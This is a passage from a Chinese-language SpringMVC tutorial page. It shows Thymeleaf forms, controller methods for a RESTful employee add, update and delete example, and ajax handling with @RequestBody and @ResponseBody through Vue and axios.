class="keyword">var</span> delete_form = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;delete_form&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//将触发事件的超链接的href属性为表单的action属性赋值</span></span></span><br><span class="line"><span class="language-javascript">                delete_form.<span class="property">action</span> = event.<span class="property">target</span>.<span class="property">href</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//提交表单</span></span></span><br><span class="line"><span class="language-javascript">                delete_form.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//阻止超链接的默认跳转行为</span></span></span><br><span class="line"><span class="language-javascript">                event.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="③控制器方法"><a href="#③控制器方法" class="headerlink" title="③控制器方法"></a>③控制器方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/employee/&#123;id&#125;&quot;, method = RequestMethod.DELETE)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">deleteEmployee</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id)</span>&#123;</span><br><span class="line">    employeeDao.delete(id);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;redirect:/employee&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-6、具体功能：跳转到添加数据页面"><a href="#8-6、具体功能：跳转到添加数据页面" class="headerlink" title="8.6、具体功能：跳转到添加数据页面"></a>8.6、具体功能：跳转到添加数据页面</h2><h3 id="①配置view-controller-1"><a href="#①配置view-controller-1" class="headerlink" title="①配置view-controller"></a>①配置view-controller</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:view-controller</span> <span class="attr">path</span>=<span class="string">&quot;/toAdd&quot;</span> <span class="attr">view-name</span>=<span class="string">&quot;employee_add&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">mvc:view-controller</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="②创建employee-add-html"><a href="#②创建employee-add-html" class="headerlink" title="②创建employee_add.html"></a>②创建employee_add.html</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Add Employee<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">th:action</span>=<span class="string">&quot;@&#123;/employee&#125;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">            lastName:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;lastName&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            email:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            gender:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>male</span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span>female<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;add&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="8-7、具体功能：执行保存"><a href="#8-7、具体功能：执行保存" class="headerlink" title="8.7、具体功能：执行保存"></a>8.7、具体功能：执行保存</h2><h3 id="①控制器方法-1"><a href="#①控制器方法-1" class="headerlink" title="①控制器方法"></a>①控制器方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/employee&quot;, method = RequestMethod.POST)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">addEmployee</span><span class="params">(Employee employee)</span>&#123;</span><br><span class="line">    employeeDao.save(employee);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;redirect:/employee&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-8、具体功能：跳转到更新数据页面"><a href="#8-8、具体功能：跳转到更新数据页面" class="headerlink" title="8.8、具体功能：跳转到更新数据页面"></a>8.8、具体功能：跳转到更新数据页面</h2><h3 id="①修改超链接"><a href="#①修改超链接" class="headerlink" title="①修改超链接"></a>①修改超链接</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;&#x27;/employee/&#x27;+$&#123;employee.id&#125;&#125;&quot;</span>&gt;</span>update<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="②控制器方法"><a href="#②控制器方法" class="headerlink" title="②控制器方法"></a>②控制器方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/employee/&#123;id&#125;&quot;, method = RequestMethod.GET)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getEmployeeById</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id, Model model)</span>&#123;</span><br><span class="line">    <span class="type">Employee</span> <span class="variable">employee</span> <span class="operator">=</span> employeeDao.get(id);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;employee&quot;</span>, employee);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;employee_update&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="③创建employee-update-html"><a href="#③创建employee-update-html" class="headerlink" title="③创建employee_update.html"></a>③创建employee_update.html</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Update Employee<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">th:action</span>=<span class="string">&quot;@&#123;/employee&#125;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_method&quot;</span> <span class="attr">value</span>=<span class="string">&quot;put&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">th:value</span>=<span class="string">&quot;$&#123;employee.id&#125;&quot;</span>&gt;</span></span><br><span class="line">            lastName:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;lastName&quot;</span> <span class="attr">th:value</span>=<span class="string">&quot;$&#123;employee.lastName&#125;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            email:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">th:value</span>=<span class="string">&quot;$&#123;employee.email&#125;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">                th:field=&quot;$&#123;employee.gender&#125;&quot;可用于单选框或复选框的回显</span></span><br><span class="line"><span class="comment">                若单选框的value和employee.gender的值一致，则添加checked=&quot;checked&quot;属性</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">            gender:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span><span class="attr">th:field</span>=<span class="string">&quot;$&#123;employee.gender&#125;&quot;</span>&gt;</span>male</span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span><span class="attr">th:field</span>=<span class="string">&quot;$&#123;employee.gender&#125;&quot;</span>&gt;</span>female<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;update&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="8-9、具体功能：执行更新"><a href="#8-9、具体功能：执行更新" class="headerlink" title="8.9、具体功能：执行更新"></a>8.9、具体功能：执行更新</h2><h3 id="①控制器方法-2"><a href="#①控制器方法-2" class="headerlink" title="①控制器方法"></a>①控制器方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/employee&quot;, method = RequestMethod.PUT)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">updateEmployee</span><span class="params">(Employee employee)</span>&#123;</span><br><span class="line">    employeeDao.save(employee);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;redirect:/employee&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="9、SpringMVC处理ajax请求"><a href="#9、SpringMVC处理ajax请求" class="headerlink" title="9、SpringMVC处理ajax请求"></a>9、SpringMVC处理ajax请求</h1><h2 id="9-1、-RequestBody"><a href="#9-1、-RequestBody" class="headerlink" title="9.1、@RequestBody"></a>9.1、@RequestBody</h2><p>@RequestBody可以获取请求体信息，使用@RequestBody注解标识控制器方法的形参，当前请求的请求体就会为当前注解所标识的形参赋值</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--此时必须使用post请求方式，因为get请求没有请求体--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">th:action</span>=<span class="string">&quot;@&#123;/test/RequestBody&#125;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test/RequestBody&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testRequestBody</span><span class="params">(<span class="meta">@RequestBody</span> String requestBody)</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;requestBody:&quot;</span>+requestBody);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果：</p><p>requestBody:username&#x3D;admin&amp;password&#x3D;123456</p><h2 id="9-2、-RequestBody获取json格式的请求参数"><a href="#9-2、-RequestBody获取json格式的请求参数" class="headerlink" title="9.2、@RequestBody获取json格式的请求参数"></a>9.2、@RequestBody获取json格式的请求参数</h2><blockquote><p>在使用了axios发送ajax请求之后，浏览器发送到服务器的请求参数有两种格式：</p><p>1、name&#x3D;value&amp;name&#x3D;value…，此时的请求参数可以通过request.getParameter()获取，对应</p><p>SpringMVC中，可以直接通过控制器方法的形参获取此类请求参数</p><p>2、{key:value,key:value,…}，此时无法通过request.getParameter()获取，之前我们使用操作</p><p>json的相关jar包gson或jackson处理此类请求参数，可以将其转换为指定的实体类对象或map集</p><p>合。在SpringMVC中，直接使用@RequestBody注解标识控制器方法的形参即可将此类请求参数</p><p>转换为java对象</p></blockquote><p>使用@RequestBody获取json格式的请求参数的条件：</p><p>1、导入jackson的依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.12.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2、SpringMVC的配置文件中设置开启mvc的注解驱动</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--开启mvc的注解驱动--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>3、在控制器方法的形参位置，设置json格式的请求参数要转换成的java类型（实体类或map）的参</p><p>数，并使用@RequestBody注解标识</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;测试@RequestBody获取json格式的请求参数&quot;</span>@<span class="attr">click</span>=<span class="string">&quot;testRequestBody()&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">th:src</span>=<span class="string">&quot;@&#123;/js/vue.js&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">th:src</span>=<span class="string">&quot;@&#123;/js/axios.min.js&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> vue = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">testRequestBody</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                axios.<span class="title function_">post</span>(</span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&quot;/SpringMVC/test/RequestBody/json&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                    &#123;<span class="attr">username</span>:<span class="string">&quot;admin&quot;</span>,<span class="attr">password</span>:<span class="string">&quot;123456&quot;</span>&#125;</span></span><br><span class="line"><span class="language-javascript">                ).<span class="title function_">then</span>(<span class="function"><span class="params">response</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(response.<span class="property">data</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将json格式的数据转换为map集合</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test/RequestBody/json&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testRequestBody</span><span class="params">(<span class="meta">@RequestBody</span> Map&lt;String, Object&gt; map,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    System.out.println(map);</span><br><span class="line">    <span class="comment">//&#123;username=admin, password=123456&#125;</span></span><br><span class="line">    response.getWriter().print(<span class="string">&quot;hello,axios&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将json格式的数据转换为实体类对象</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test/RequestBody/json&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testRequestBody</span><span class="params">(<span class="meta">@RequestBody</span> User user, HttpServletResponseresponse)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    System.out.println(user);</span><br><span class="line">    <span class="comment">//User&#123;id=null, username=&#x27;admin&#x27;, password=&#x27;123456&#x27;, age=null,gender=&#x27;null&#x27;&#125;</span></span><br><span class="line">response.getWriter().print(<span class="string">&quot;hello,axios&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="9-3、-ResponseBody"><a href="#9-3、-ResponseBody" class="headerlink" title="9.3、@ResponseBody"></a>9.3、@ResponseBody</h2><p>@ResponseBody用于标识一个控制器方法，可以将该方法的返回值直接作为响应报文的响应体响应到浏览器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testResponseBody&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testResponseBody</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//此时会跳转到逻辑视图success所对应的页面</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@RequestMapping(&quot;/testResponseBody&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testResponseBody</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//此时响应浏览器数据success</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="9-4、-ResponseBody响应浏览器json数据"><a href="#9-4、-ResponseBody响应浏览器json数据" class="headerlink" title="9.4、@ResponseBody响应浏览器json数据"></a>9.4、@ResponseBody响应浏览器json数据</h2><p>服务器处理ajax请求之后，大多数情况都需要向浏览器响应一个java对象，此时必须将java对象转换为</p><p>json字符串才可以响应到浏览器，之前我们使用操作json数据的jar包gson或jackson将java对象转换为</p><p>json字符串。在SpringMVC中，我们可以直接使用@ResponseBody注解实现此功能</p><p>@ResponseBody响应浏览器json数据的条件：</p><p>1、导入jackson的依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.12.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2、SpringMVC的配置文件中设置开启mvc的注解驱动</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--开启mvc的注解驱动--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>3、使用@ResponseBody注解标识控制器方法，在方法中，将需要转换为json字符串并响应到浏览器</p><p>的java对象作为控制器方法的返回值，此时SpringMVC就可以将此对象直接转换为json字符串并响应到浏览器</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;测试@ResponseBody响应浏览器json格式的数据&quot;</span>@<span class="attr">click</span>=<span class="string">&quot;testResponseBody()&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">th:src</span>=<span class="string">&quot;@&#123;/js/vue.js&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">th:src</span>=<span class="string">&quot;@&#123;/js/axios.min.js&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> vue = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">testResponseBody</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                axios.<span class="title function_">post</span>(<span class="string">&quot;/SpringMVC/test/ResponseBody/json&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">response</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(response.<span class="property">data</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 